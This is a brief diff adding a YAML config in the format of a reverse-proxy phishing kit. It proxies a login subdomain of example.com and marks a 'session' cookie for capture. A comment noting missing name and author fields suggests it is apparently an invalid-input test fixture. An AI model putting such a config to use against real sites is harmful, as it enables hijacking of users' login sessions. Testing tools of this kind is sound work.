@@ -1,0 +1,13 @@
+# Missing: name, author
+version: "1"
+
+proxy_hosts:
+  - phish_sub: login
+    orig_sub:  login
+    domain:    example.com
+
+auth_tokens:
+  - domain: ".example.com"
+    keys:
+      - name: session
+        required: true
